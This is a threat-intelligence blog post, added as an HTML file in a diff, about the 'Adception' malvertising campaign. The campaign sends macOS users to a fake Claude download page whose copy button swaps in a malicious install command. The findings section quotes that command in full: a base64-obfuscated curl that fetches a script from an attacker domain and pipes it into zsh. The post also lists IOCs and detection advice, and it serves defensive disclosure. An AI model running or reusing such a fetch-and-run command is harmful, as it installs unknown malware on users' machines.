@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Adception InstallFix Campaign Fakes Claude Download Page and Pipes Remote Script Into macOS zsh | LLM ThreatIntel</title>
+  <meta name="description" content="A malvertising campaign tracked as Adception (Threadlinqs TL-2026-3410) sends macOS users searching for &#x27;claude mac&#x27; to a fake Claude download page at claude-desk-code[.]com, whose copy button silently replaces the legitimate install command with one that pipes a remote script from lake-90[.]com straight into zsh. Push Security detected the campaign in a customer environment and named the redirect technique Adception, and BleepingComputer and NSFOCUS covered it. Because the final payload was never recovered, the malware family, persistence, and command and control for this specific macOS chain remain unknown.">
+  <meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+  <meta name="author" content="LLM ThreatIntel">
+  <meta name="theme-color" content="#0c0a12">
+  <link rel="canonical" href="https://llm-threatintel.com/posts/2026-10-14-adception-installfix-fake-claude-download-macos.html">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='8' fill='%238b5cf6'/><text x='16' y='21' text-anchor='middle' font-family='monospace' font-weight='bold' font-size='11' fill='white'>LLM</text></svg>">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Adception InstallFix Campaign Fakes Claude Download Page and Pipes Remote Script Into macOS zsh">
+  <meta property="og:description" content="A malvertising campaign tracked as Adception (Threadlinqs TL-2026-3410) sends macOS users searching for &#x27;claude mac&#x27; to a fake Claude download page at claude-desk-code[.]com, whose copy button silently replaces the legitimate install command with one that pipes a remote script from lake-90[.]com straight into zsh. Push Security detected the campaign in a customer environment and named the redirect technique Adception, and BleepingComputer and NSFOCUS covered it. Because the final payload was never recovered, the malware family, persistence, and command and control for this specific macOS chain remain unknown.">
+  <meta property="og:url" content="https://llm-threatintel.com/posts/2026-10-14-adception-installfix-fake-claude-download-macos.html">
+  <meta property="og:site_name" content="LLM ThreatIntel">
+  <meta property="og:image" content="https://llm-threatintel.com/assets/og/llm-threatintel-home.png">
+  <meta property="og:image:alt" content="Adception InstallFix Campaign Fakes Claude Download Page and Pipes Remote Script Into macOS zsh">
+  <meta property="article:published_time" content="2026-10-14T00:00:00Z">
+  <meta property="article:modified_time" content="2026-10-14T00:00:00Z">
+  <meta property="article:tag" content="phishing">
+  <meta property="article:tag" content="malware">
+  <meta property="article:tag" content="malicious-tool">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Adception InstallFix Campaign Fakes Claude Download Page and Pipes Remote Script Into macOS zsh">
+  <meta name="twitter:description" content="A malvertising campaign tracked as Adception (Threadlinqs TL-2026-3410) sends macOS users searching for &#x27;claude mac&#x27; to a fake Claude download page at claude-desk-code[.]com, whose copy button silently replaces the legitimate install command with one that pipes a remote script from lake-90[.]com straight into zsh. Push Security detected the campaign in a customer environment and named the redirect technique Adception, and BleepingComputer and NSFOCUS covered it. Because the final payload was never recovered, the malware family, persistence, and command and control for this specific macOS chain remain unknown.">
+  <meta name="twitter:image" content="https://llm-threatintel.com/assets/og/llm-threatintel-home.png">
+
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Adception InstallFix Campaign Fakes Claude Download Page and Pipes Remote Script Into macOS zsh",
+  "description": "A malvertising campaign tracked as Adception (Threadlinqs TL-2026-3410) sends macOS users searching for 'claude mac' to a fake Claude download page at claude-desk-code[.]com, whose copy button silently replaces the legitimate install command with one that pipes a remote script from lake-90[.]com straight into zsh. Push Security detected the campaign in a customer environment and named the redirect technique Adception, and BleepingComputer and NSFOCUS covered it. Because the final payload was never recovered, the malware family, persistence, and command and control for this specific macOS chain remain unknown.",
+  "datePublished": "2026-10-14T00:00:00Z",
+  "dateModified": "2026-10-14T00:00:00Z",
+  "author": {
+    "@type": "Organization",
+    "name": "LLM ThreatIntel"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "LLM ThreatIntel"
+  },
+  "mainEntityOfPage": "https://llm-threatintel.com/posts/2026-10-14-adception-installfix-fake-claude-download-macos.html",
+  "keywords": [
+    "phishing",
+    "malware",
+    "malicious-tool"
+  ]
+}
+  </script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="header-inner">
+      <a href="/" class="site-logo">
+        <span class="logo-mark">LLM</span>
+        <span>LLM <span class="logo-accent">ThreatIntel</span></span>
+      </a>
+      <nav class="site-nav">
+        <a href="/">Intel Feed</a>
+        <a href="/#actors">Threat Actors</a>
+        <a href="/#ioc-feed">IOC Feed</a>
+        <a href="/#blog">Blog</a>
+        <a href="/#about">About</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="main-content" id="app-content">
+    <a href="/" class="back-link">&larr; Back to feed</a>
+    <div class="post-meta" style="margin-bottom:1rem">
+      <span class="post-date">2026-10-14</span>
+      <span class="post-tag tag-phishing">Phishing</span><span class="post-tag tag-malware">Malware</span><span class="post-tag tag-malicious-tool">Malicious Tool</span>
+      <span class="post-tag tlp-clear">TLP:CLEAR</span>
+    </div>
+    <div class="post-content"><h1>Adception InstallFix Campaign Fakes Claude Download Page and Pipes Remote Script Into macOS zsh</h1>
+<p><strong>Date:</strong> 2026-10-14<br><strong>Tags:</strong> phishing, malware, malicious-tool</p>
+<h2>Executive Summary</h2>
+<p>A malvertising campaign tracked as Adception (Threadlinqs TL-2026-3410) sends macOS users searching for &#x27;claude mac&#x27; to a fake Claude download page at claude-desk-code[.]com, whose copy button silently replaces the legitimate install command with one that pipes a remote script from lake-90[.]com straight into zsh. Push Security detected the campaign in a customer environment and named the redirect technique Adception, and BleepingComputer and NSFOCUS covered it. Because the final payload was never recovered, the malware family, persistence, and command and control for this specific macOS chain remain unknown.</p>
+<h2>Campaign Summary</h2>
+<table><thead><tr><th>Field</th><th>Detail</th></tr></thead><tbody><tr><td>Campaign / Malware</td><td>Adception</td></tr><tr><td>Attribution</td><td>Unknown (confidence: none)</td></tr><tr><td>Target</td><td>macOS users searching for Claude installation instructions</td></tr><tr><td>Vector</td><td>Google Ads and Bing click tracking redirect to a fake Claude download page with clipboard swapping InstallFix lure</td></tr><tr><td>Status</td><td>active</td></tr><tr><td>First Observed</td><td>2026-10-09</td></tr></tbody></table>
+<h2>Detailed Findings</h2>
+<p>According to Threadlinqs, the campaign abuses Google Ads, a Bing click tracking redirect, and a compromised South American retailer site to route users searching for &#x27;claude mac&#x27; to a fake Claude download page at claude-desk-code[.]com. The page shows the legitimate install command but copies a different command to the clipboard that pipes a remote script from lake-90[.]com into zsh. Threadlinqs reported the copy button writes echo &quot;Downloading Claude: https://claude.ai/install.sh&quot; &amp;&amp; curl -s $(echo &quot; &quot; | openssl base64 -d -A) | zsh, where the base64 decodes to https://lake-90[.]com/curl/inhgup9a/a90fkbqdg8d0mus64oh8dw.dat, a script downloaded silently and piped into zsh with the victim&#x27;s user level permissions. Push Security, which detected the campaign in a customer environment, named the redirect technique Adception in a 2026-10-09 report, and BleepingComputer reported it the same day while NSFOCUS covered it on 2026-10-13 tracking the toolchain as AcSig. Threadlinqs noted the final payload was not recovered by any source, so the malware family, persistence, and command and control for this macOS chain are unknown, and Push Security lists seven further lure domains in the same InstallFix cluster. Separately reported InstallFix campaigns against Claude Code delivered Amatera Stealer (BleepingComputer, 2026-03-06) and a RedLine linked Windows chain (Trend Micro, 2026-05-05), which are related context and not confirmed to share infrastructure with this campaign.</p>
+<h2>MITRE ATT&amp;CK Mapping</h2>
+<table><thead><tr><th>Technique</th><th>ID</th><th>Context</th></tr></thead><tbody><tr><td>Command and Scripting Interpreter: Unix Shell</td><td>T1059.004</td><td>Clipboard swapped command pipes a remote script into zsh on macOS</td></tr><tr><td>Masquerading</td><td>T1036</td><td>Fake Claude download page impersonates Anthropic installation instructions</td></tr></tbody></table>
+<h2>IOCs</h2>
+<h3>Domains</h3>
+<pre><code class="language-">claude-desk-code.com
+lake-90.com</code></pre>
+<h3>Full URL Paths</h3>
+<p>_IOCs from Threadlinqs TL-2026-3410. Push Security reports seven further lure domains in the same InstallFix cluster._</p>
+<h3>Splunk Format</h3>
+<pre><code class="language-">&quot;claude-desk-code.com&quot; OR &quot;lake-90.com&quot;</code></pre>
+<h3>Affected Platforms</h3>
+<pre><code class="language-">Apple macOS</code></pre>
+<h2>Detection Recommendations</h2>
+<p>Alert on shell pipelines that decode base64 and pipe the result into zsh or sh, and on outbound connections to lake-90[.]com and the wider InstallFix lure cluster. Block sponsored search results that redirect through bing.com tracking links to lookalike install pages, and educate macOS users to verify install commands against the official Anthropic documentation rather than pasting clipboard content from a download page.</p>
+<h2>References</h2>
+<ul><li>[Threadlinqs] Fake Claude Installation Page Delivers Malware (TL-2026-3410) (2026-10-13) — https://intel.threadlinqs.com/threat/TL-2026-3410</li></ul></div>
+  </main>
+
+  <footer class="site-footer">
+    <span class="footer-brand">LLM ThreatIntel</span> &mdash; Automated GenAI Threat Intelligence
+    <div class="footer-links">
+      Defensive research only <span>&middot;</span> TLP:CLEAR <span>&middot;</span> Automated via Claude Code <span>&middot;</span> llm-threatintel.com
+    </div>
+  </footer>
+
+  <script>
+  document.querySelectorAll('pre').forEach(pre => {
+    const btn = document.createElement('button');
+    btn.className = 'copy-btn';
+    btn.textContent = 'Copy';
+    btn.addEventListener('click', () => {
+      const code = pre.querySelector('code');
+      const text = code ? code.textContent : pre.textContent;
+      navigator.clipboard.writeText(text).then(() => {
+        btn.textContent = 'Copied!';
+        setTimeout(() => btn.textContent = 'Copy', 1500);
+      });
+    });
+    pre.style.position = 'relative';
+    pre.appendChild(btn);
+  });
+  </script>
+</body>
+</html>
